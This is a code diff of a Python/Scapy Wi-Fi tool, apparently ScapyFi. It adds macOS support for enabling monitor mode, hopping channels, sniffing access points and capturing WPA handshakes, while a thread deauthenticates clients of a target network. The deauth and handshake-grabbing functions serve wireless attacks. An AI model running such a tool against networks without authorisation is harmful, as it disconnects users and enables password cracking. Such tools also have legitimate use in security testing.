@@ -20,9 +20,15 @@ import sys
 import re
 import time
 import string
-
+try:
+    import netifaces
+except:
+     os.system("pip3 install netifaces")
 
 #Global variables and banner:
+OSX = True
+if os.path.isfile("/bin/iwconfig"):
+    OSX = False
 ap_list = []
 cli_list = []
 to_frames = 0
@@ -86,12 +92,17 @@ Use for educational purpose only.
 def signal_handler(signal,frame):
     print("\nDisabling monitoring mode on wireless NIC...",end='')
     try:
-        os.system("ip link set " + interface + " down")
-        os.system("iw "+ interface + " set type managed")
-        os.system("ip link set " + interface +" up")
-        os.system("NetworkManager")
-        print(TGREEN + "done" + TWHITE)
-        sys.exit(1)
+        if OSX == False:
+            os.system("ip link set " + interface + " down")
+            os.system("iw "+ interface + " set type managed")
+            os.system("ip link set " + interface +" up")
+            os.system("NetworkManager")
+            print(TGREEN + "done" + TWHITE)
+            sys.exit(1)
+        else:
+            os.system("ifconfig "+ interface + " up")
+            print(TGREEN + "done" + TWHITE)
+            sys.exit(1)
     except Exception as e:
         print("Error when disabling monitor mode")
         print(e)
@@ -110,6 +121,11 @@ def check_root():
         print("You need to be root to run this tool.")
         exit(1)
 
+#Check if NIC is valid
+def is_interface_up(interface):
+    addr = netifaces.ifaddresses(interface)
+    return netifaces.AF_INET in addr
+
 #Check the argument passed to the script
 def check_args():
     if(len(sys.argv) < 3 or len(sys.argv) > 3):
@@ -119,8 +135,9 @@ def check_args():
         print("Argument "+ str(sys.argv[1]) + " not understood")
         print("Usage : ScapyFi.py -i interface_name")
         exit(1)
-    path = "/sys/class/net/"+sys.argv[2]
-    if(not os.path.exists(path)):
+    try:
+        print(is_interface_up(sys.argv[2]))
+    except:
         print("Interface not found.")
         exit(1)
 
@@ -131,12 +148,16 @@ def check_args():
 def enable_monitoring(interface_name):
     print("Activating monitoring mode on " + str(interface_name) + "...",end='')
     try:
-        os.system("killall wpa_supplicant")
-        os.system("killall NetworkManager")
-        os.system("ip link set " + interface_name + " down")
-        os.system("iw "+ interface_name + " set monitor control")
-        os.system("ip link set " + interface_name + " up")
-        print(TGREEN + "done." + TWHITE)
+        if OSX == False:
+            os.system("killall wpa_supplicant")
+            os.system("killall NetworkManager")
+            os.system("ip link set " + interface_name + " down")
+            os.system("iw "+ interface_name + " set monitor control")
+            os.system("ip link set " + interface_name + " up")
+            print(TGREEN + "done." + TWHITE)
+        else:
+            os.system("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport "+ interface + " -z")
+            print(TGREEN + "done." + TWHITE)
     except Exception as e:
         print("Error when activating monitoring mode:")
         print(e)
@@ -186,10 +207,8 @@ def packet_handler(packet):
             ap_list_temp.append(packet.addr2)
             print("[+] ", end="")
             ap.print_ap()
-
     except Exception as e:
         pass
-
 
 #The network sniffer simply hop between channels and sniff the wireless network around the user.
 def network_sniffer():
@@ -197,8 +216,11 @@ def network_sniffer():
     print("[INFO] Press Ctrl+c to stop the capture")
     signal.signal(signal.SIGINT,signal_handler2) #Handle the ctrl+c to not quit and return to main menu.
     while True:
-        sniff(iface=interface,prn=packet_handler,count=3)
-        os.system("iw dev "+ interface + " set channel %d" % chans[i])
+        sniff(iface=interface,prn=packet_handler,count=3,monitor=True)
+        if OSX == False:
+            os.system("iw dev "+ interface + " set channel %d" % chans[i])
+        else:
+            os.system("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport " + interface + " --channel=%d" % chans[i])
         i = (i + 1) % len(chans)
         time.sleep(1)
 #This function is going to deauth the clients on the specified AP
@@ -253,7 +275,10 @@ def grab_handshake(ap):
         os.system("rm ./handshake/handshake.pcap") # In case the program was shutdown in the process
     os.system("clear")
     print("Switching to channel " + str(ap.channel))
-    os.system("iw dev "+ interface + " set channel %d" % ap.channel)
+    if OSX == False:
+        os.system("iw dev "+ interface + " set channel %d" % ap.channel)
+    else:
+        os.system("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport " + interface + " --channel=%d" % ap.channel)
     print("Sniffing " + ap.ssid + "...")
     signal.signal(signal.SIGINT,signal_handler2)
 
@@ -262,10 +287,10 @@ def grab_handshake(ap):
     t = Thread(target=deauth,args=(ap, ))
     t.start()
     ############################
-
-
-
-    p = sniff(iface=interface, stop_filter=checkForWPAHandshake, filter="(ether dst "+ap.mac+") or (ether src "+ap.mac+")") #Sniff for handshake
+    if OSX == False:
+        p = sniff(iface=interface, stop_filter=checkForWPAHandshake, filter='(ether dst '+ap.mac+') or (ether src '+ap.mac+')',monitor=True) #Sniff for handshake
+    else:
+        p = sniff(iface=interface, stop_filter=checkForWPAHandshake, monitor=True) #Sniff for handshake
 
     #Out of the sniff function -> checkForWPAHandshake = True => Handshake grabbed
 
@@ -281,7 +306,7 @@ def handshake_grabber():
     global from_frames
     global to_frames
     from_frames = 0
-    to_frames = 0 
+    to_frames = 0
 
     signal.signal(signal.SIGINT, signal.SIG_DFL)
     if len(ap_list) == 0:
